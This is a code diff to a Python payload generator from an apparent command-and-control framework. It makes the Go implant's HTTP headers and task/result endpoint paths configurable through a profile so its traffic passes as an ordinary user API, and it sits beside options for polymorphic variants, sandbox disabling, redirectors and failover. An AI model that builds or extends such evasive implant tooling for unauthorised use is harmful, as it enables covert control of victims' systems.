@@ -156,6 +156,9 @@ class PayloadGenerator:
         # Extract failover URLs from profile_config if use_failover is enabled
         failover_urls = profile_config.get('failover_urls', []) if use_failover else []
 
+        # Extract headers from profile for Go agent
+        profile_headers = profile_config.get('headers', {'User-Agent': 'Go C2 Agent'})
+
         print(f"[+] Generating polymorphic variant")
         if payload_type == "phantom_hawk_agent":
             return self._generate_phantom_hawk_agent(
@@ -163,7 +166,7 @@ class PayloadGenerator:
             )
         elif payload_type == "go_agent":
             return self._generate_go_agent(
-                agent_id, secret_key, c2_server_url, profile_config, disable_sandbox=disable_sandbox, platform=platform, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port, use_failover=use_failover, failover_urls=failover_urls
+                agent_id, secret_key, c2_server_url, profile_config, disable_sandbox=disable_sandbox, platform=platform, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port, use_failover=use_failover, failover_urls=failover_urls, profile_headers=profile_headers
             )
         else:
             raise ValueError(f"Unsupported payload type: {payload_type}")
@@ -445,9 +448,11 @@ class PayloadGenerator:
         return agent_template.strip()
 
 
-    def _generate_go_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate=False, disable_sandbox=False, platform='windows', use_redirector=False, redirector_host='0.0.0.0', redirector_port=80, use_failover=False, failover_urls=None):
+    def _generate_go_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate=False, disable_sandbox=False, platform='windows', use_redirector=False, redirector_host='0.0.0.0', redirector_port=80, use_failover=False, failover_urls=None, profile_headers=None):
         if failover_urls is None:
             failover_urls = []
+        if profile_headers is None:
+            profile_headers = {'User-Agent': 'Go C2 Agent'}
         import subprocess
         import os
         import tempfile
@@ -632,6 +637,33 @@ class PayloadGenerator:
         go_code = go_code.replace('{AGENT_MAX_FAIL_COUNT_FIELD}', agent_max_fail_count_field)
         go_code = go_code.replace('{AGENT_LAST_CONNECTION_ATTEMPT_FIELD}', agent_last_connection_attempt_field)
         go_code = go_code.replace('{AGENT_IN_FAILOVER_ATTEMPT_FIELD}', agent_in_failover_attempt_field)
+
+        # Generate Go representation of profile headers
+        # Convert the profile headers dictionary to Go map literal format
+        go_headers_parts = []
+        for key, value in profile_headers.items():
+            # Escape quotes in header values
+            escaped_value = value.replace('"', '\\"')
+            go_headers_parts.append(f'"{key}": "{escaped_value}"')
+        go_headers_literal = "{" + ", ".join(go_headers_parts) + "}"
+
+        # Replace the hardcoded headers in the struct initialization
+        go_code = go_code.replace('map[string]string{"User-Agent": "Go C2 Agent"}', f"map[string]string{go_headers_literal}")
+
+        # Extract endpoints from profile_config to replace hardcoded defaults in struct initialization
+        endpoints = profile_config.get('endpoints', {})
+        register_uri = endpoints.get('register', '/api/users/register')
+        tasks_uri = endpoints.get('tasks', '/api/users/{agent_id}/profile')
+        results_uri = endpoints.get('results', '/api/users/{agent_id}/activity')
+        interactive_uri = endpoints.get('interactive', '/api/users/{agent_id}/settings')
+        interactive_status_uri = endpoints.get('interactive_status', '/api/users/{agent_id}/status')
+
+        # Replace the hardcoded endpoint paths in the struct initialization with profile-defined values
+        go_code = go_code.replace('"/api/users/register"', f'"{register_uri}"')
+        go_code = go_code.replace('"/api/users/{agent_id}/profile"', f'"{tasks_uri}"')
+        go_code = go_code.replace('"/api/users/{agent_id}/activity"', f'"{results_uri}"')
+        go_code = go_code.replace('"/api/users/{agent_id}/settings"', f'"{interactive_uri}"')
+        go_code = go_code.replace('"/api/users/{agent_id}/status"', f'"{interactive_status_uri}"')
 
         # Extract kill_date and working_hours from profile_config
         kill_date = profile_config.get('kill_date', '2025-12-31T23:59:59Z')
